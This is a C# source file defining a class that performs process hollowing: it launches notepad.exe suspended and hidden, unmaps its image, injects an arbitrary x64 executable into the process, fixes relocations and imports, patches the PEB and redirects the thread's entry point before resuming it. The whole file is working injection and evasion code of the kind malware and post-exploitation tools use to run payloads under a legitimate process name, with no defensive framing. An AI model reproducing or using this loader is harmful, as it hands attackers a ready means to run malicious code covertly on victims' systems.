using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class PeMemoryLoader
{
    public class Result
    {
        public string StdOut { get; set; }
        public string StdErr { get; set; }
        public int ExitCode { get; set; }
        public string Error { get; set; }
    }

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CREATE_SUSPENDED = 0x00000004;
    const uint CREATE_NO_WINDOW = 0x08000000;
    const uint STARTF_USESTDHANDLES = 0x00000100;
    const uint INFINITE = 0xFFFFFFFF;
    const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT64
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreatePipe(out IntPtr hRead, out IntPtr hWrite, IntPtr lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool PeekNamedPipe(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize,
        out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead,
        out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);

    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr LoadLibraryA(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    static int ReadInt(byte[] data, int offset) { return BitConverter.ToInt32(data, offset); }
    static uint ReadUInt(byte[] data, int offset) { return BitConverter.ToUInt32(data, offset); }
    static long ReadLong(byte[] data, int offset) { return BitConverter.ToInt64(data, offset); }
    static ushort ReadUShort(byte[] data, int offset) { return BitConverter.ToUInt16(data, offset); }

    static bool WriteRemote(IntPtr proc, IntPtr addr, byte[] data)
    {
        return WriteProcessMemory(proc, addr, data, data.Length, out _);
    }

    static byte[] SubArray(byte[] src, int offset, int length)
    {
        byte[] dst = new byte[length];
        Buffer.BlockCopy(src, offset, dst, 0, length);
        return dst;
    }

    static string ReadAscii(byte[] data, int offset)
    {
        int end = offset;
        while (end < data.Length && data[end] != 0) end++;
        return Encoding.ASCII.GetString(data, offset, end - offset);
    }

    static int RvaToOffset(byte[] pe, int nt, uint rva)
    {
        int sec = nt + 24 + ReadUShort(pe, nt + 0x14);
        ushort numSections = ReadUShort(pe, nt + 6);
        for (int i = 0; i < numSections; i++)
        {
            int s = sec + i * 40;
            uint va = ReadUInt(pe, s + 12);
            uint vsize = ReadUInt(pe, s + 8);
            uint raw = ReadUInt(pe, s + 20);
            uint rawSize = ReadUInt(pe, s + 16);
            if (rva >= va && rva < va + Math.Max(vsize, rawSize))
                return (int)(raw + (rva - va));
        }
        return -1;
    }

    static void ApplyRelocations(byte[] pe, IntPtr hProcess, IntPtr remoteBase, long delta, int nt)
    {
        uint relocRva = ReadUInt(pe, nt + 0xB0);
        uint relocSize = ReadUInt(pe, nt + 0xB4);
        if (relocRva == 0 || relocSize == 0 || delta == 0) return;
        int offset = RvaToOffset(pe, nt, relocRva);
        int end = offset + (int)relocSize;
        while (offset < end)
        {
            uint pageRva = ReadUInt(pe, offset);
            uint blockSize = ReadUInt(pe, offset + 4);
            if (blockSize < 8) break;
            int count = (int)((blockSize - 8) / 2);
            for (int i = 0; i < count; i++)
            {
                ushort entry = ReadUShort(pe, offset + 8 + i * 2);
                int type = entry >> 12;
                int off = entry & 0xfff;
                if (type != 0xA) continue;
                uint patchRva = pageRva + (uint)off;
                byte[] cur = new byte[8];
                IntPtr addr = IntPtr.Add(remoteBase, (int)patchRva);
                ReadProcessMemory(hProcess, addr, cur, 8, out _);
                long val = BitConverter.ToInt64(cur, 0) + delta;
                WriteRemote(hProcess, addr, BitConverter.GetBytes(val));
            }
            offset += (int)blockSize;
        }
    }

    static void ResolveImports(byte[] pe, IntPtr hProcess, IntPtr remoteBase, int nt)
    {
        uint importRva = ReadUInt(pe, nt + 0x90);
        if (importRva == 0) return;
        int descOffset = RvaToOffset(pe, nt, importRva);
        while (true)
        {
            uint nameRva = ReadUInt(pe, descOffset + 12);
            uint firstThunk = ReadUInt(pe, descOffset + 16);
            uint origThunk = ReadUInt(pe, descOffset);
            if (nameRva == 0) break;
            string dllName = ReadAscii(pe, RvaToOffset(pe, nt, nameRva));
            IntPtr hMod = LoadLibraryA(dllName);
            if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);
            uint thunk = origThunk != 0 ? origThunk : firstThunk;
            int thunkOff = RvaToOffset(pe, nt, thunk);
            int i = 0;
            while (true)
            {
                long lookup = ReadLong(pe, thunkOff + i * 8);
                if (lookup == 0) break;
                IntPtr fn;
                if ((lookup & 0x8000000000000000L) != 0)
                    fn = GetProcAddress(hMod, "#" + (lookup & 0xFFFF));
                else
                    fn = GetProcAddress(hMod, ReadAscii(pe, RvaToOffset(pe, nt, (uint)lookup) + 2));
                if (fn == IntPtr.Zero) throw new Exception("GetProcAddress failed");
                IntPtr iat = IntPtr.Add(remoteBase, (int)(firstThunk + (uint)(i * 8)));
                WriteRemote(hProcess, iat, BitConverter.GetBytes(fn.ToInt64()));
                i++;
            }
            descOffset += 20;
        }
    }

    static string ReadPipe(IntPtr hPipe)
    {
        var sb = new StringBuilder();
        var buf = new byte[4096];
        uint avail;
        while (PeekNamedPipe(hPipe, null, 0, out _, out avail, out _) && avail > 0)
        {
            int toRead = (int)Math.Min(avail, (uint)buf.Length);
            if (!ReadFile(hPipe, buf, toRead, out uint read, IntPtr.Zero) || read == 0) break;
            sb.Append(Encoding.UTF8.GetString(buf, 0, (int)read));
        }
        return sb.ToString();
    }

    static void PatchCommandLine(IntPtr hProcess, IntPtr peb, string arguments)
    {
        if (string.IsNullOrEmpty(arguments)) return;
        byte[] procParamsBuf = new byte[8];
        ReadProcessMemory(hProcess, IntPtr.Add(peb, 0x20), procParamsBuf, 8, out _);
        IntPtr procParams = new IntPtr(BitConverter.ToInt64(procParamsBuf, 0));
        byte[] cmdBytes = Encoding.Unicode.GetBytes(arguments + "\0");
        IntPtr remoteCmd = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)cmdBytes.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remoteCmd == IntPtr.Zero) return;
        WriteRemote(hProcess, remoteCmd, cmdBytes);
        ushort len = (ushort)(arguments.Length * 2);
        byte[] uni = new byte[16];
        Buffer.BlockCopy(BitConverter.GetBytes(len), 0, uni, 0, 2);
        Buffer.BlockCopy(BitConverter.GetBytes((ushort)(len + 2)), 0, uni, 2, 2);
        Buffer.BlockCopy(BitConverter.GetBytes(remoteCmd.ToInt64()), 0, uni, 8, 8);
        WriteRemote(hProcess, IntPtr.Add(procParams, 0x70), uni);
    }

    public static Result Execute(byte[] pe, string arguments)
    {
        var result = new Result { StdOut = "", StdErr = "", ExitCode = 1 };
        IntPtr hStdoutRead = IntPtr.Zero, hStdoutWrite = IntPtr.Zero;
        IntPtr hStderrRead = IntPtr.Zero, hStderrWrite = IntPtr.Zero;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        try
        {
            if (pe == null || pe.Length < 0x200) throw new Exception("Invalid PE buffer");
            int nt = ReadInt(pe, 0x3c);
            if (ReadUShort(pe, nt + 0x18) != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                throw new Exception("Only x64 PE images are supported for in-memory execution");
            if (ReadUShort(pe, nt + 4) != IMAGE_FILE_MACHINE_AMD64)
                throw new Exception("PE machine type is not AMD64");

            string host = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
            CreatePipe(out hStdoutRead, out hStdoutWrite, IntPtr.Zero, 0);
            CreatePipe(out hStderrRead, out hStderrWrite, IntPtr.Zero, 0);

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = (int)STARTF_USESTDHANDLES;
            si.hStdOutput = hStdoutWrite;
            si.hStdError = hStderrWrite;

            if (!CreateProcess(host, null, IntPtr.Zero, IntPtr.Zero, true,
                CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                throw new Exception("CreateProcess failed: " + Marshal.GetLastWin32Error());

            CloseHandle(hStdoutWrite); hStdoutWrite = IntPtr.Zero;
            CloseHandle(hStderrWrite); hStderrWrite = IntPtr.Zero;

            int opt = nt + 0x18;
            uint sizeOfImage = ReadUInt(pe, opt + 56);
            uint sizeOfHeaders = ReadUInt(pe, opt + 60);
            uint entry = ReadUInt(pe, opt + 16);
            long preferred = ReadLong(pe, opt + 24);

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            NtQueryInformationProcess(pi.hProcess, 0, ref pbi, Marshal.SizeOf(pbi), out _);

            byte[] pebBuf = new byte[8];
            ReadProcessMemory(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10), pebBuf, 8, out _);
            long hostBase = BitConverter.ToInt64(pebBuf, 0);

            NtUnmapViewOfSection(pi.hProcess, (IntPtr)hostBase);

            IntPtr remote = VirtualAllocEx(pi.hProcess, (IntPtr)preferred, sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remote == IntPtr.Zero)
                remote = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage,
                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remote == IntPtr.Zero) throw new Exception("VirtualAllocEx failed");

            WriteRemote(pi.hProcess, remote, SubArray(pe, 0, (int)sizeOfHeaders));

            ushort sections = ReadUShort(pe, nt + 6);
            int secTable = opt + ReadUShort(pe, nt + 0x14);
            for (int i = 0; i < sections; i++)
            {
                int s = secTable + i * 40;
                uint virtualAddress = ReadUInt(pe, s + 12);
                uint sizeRaw = ReadUInt(pe, s + 16);
                uint ptrRaw = ReadUInt(pe, s + 20);
                if (sizeRaw == 0) continue;
                WriteRemote(pi.hProcess, IntPtr.Add(remote, (int)virtualAddress),
                    SubArray(pe, (int)ptrRaw, (int)sizeRaw));
            }

            long delta = remote.ToInt64() - preferred;
            if (delta != 0) ApplyRelocations(pe, pi.hProcess, remote, delta, nt);
            ResolveImports(pe, pi.hProcess, remote, nt);

            WriteRemote(pi.hProcess, IntPtr.Add(pbi.PebBaseAddress, 0x10),
                BitConverter.GetBytes(remote.ToInt64()));
            PatchCommandLine(pi.hProcess, pbi.PebBaseAddress, arguments);

            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x10001f;
            GetThreadContext(pi.hThread, ref ctx);
            ctx.Rip = (ulong)(remote.ToInt64() + entry);
            SetThreadContext(pi.hThread, ref ctx);

            ResumeThread(pi.hThread);
            WaitForSingleObject(pi.hProcess, INFINITE);
            uint code;
            GetExitCodeProcess(pi.hProcess, out code);
            result.ExitCode = (int)code;
            result.StdOut = ReadPipe(hStdoutRead);
            result.StdErr = ReadPipe(hStderrRead);
        }
        catch (Exception ex)
        {
            result.Error = ex.Message;
            result.ExitCode = 1;
        }
        finally
        {
            if (hStdoutRead != IntPtr.Zero) CloseHandle(hStdoutRead);
            if (hStdoutWrite != IntPtr.Zero) CloseHandle(hStdoutWrite);
            if (hStderrRead != IntPtr.Zero) CloseHandle(hStderrRead);
            if (hStderrWrite != IntPtr.Zero) CloseHandle(hStderrWrite);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
        }
        return result;
    }
}
